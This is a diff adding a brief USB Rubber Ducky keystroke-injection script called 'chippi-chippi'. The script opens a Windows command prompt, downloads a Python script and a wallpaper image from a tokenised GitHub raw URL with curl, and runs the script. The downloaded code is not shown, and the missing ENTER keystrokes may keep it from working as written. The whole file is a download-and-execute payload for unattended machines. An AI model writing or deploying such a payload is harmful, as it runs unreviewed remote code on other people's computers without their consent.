@@ -1,0 +1,10 @@
+REM chippi-chippi
+REM MADE WITH LOVE<3
+DELAY 3000
+WINDOWS r 
+STRING cmd.exe
+STRING curl -o script.py  "https://raw.githubusercontent.com/STORTNY/chippi-chippi/main/good%20usb/test.py?token=GHSAT0AAAAAACKFSYFD25OEW3RFE4FXFRGCZM6VSLA" 
+DELAY 1000
+STRING curl -o wallpaper1.jpg "https://raw.githubusercontent.com/STORTNY/chippi-chippi/main/good%20usb/wallpaper1.jpg?token=GHSAT0AAAAAACKFSYFD2NK2KSSO45VSNBV4ZM6VUNA" 
+DELAY 1200
+STRING python script.py
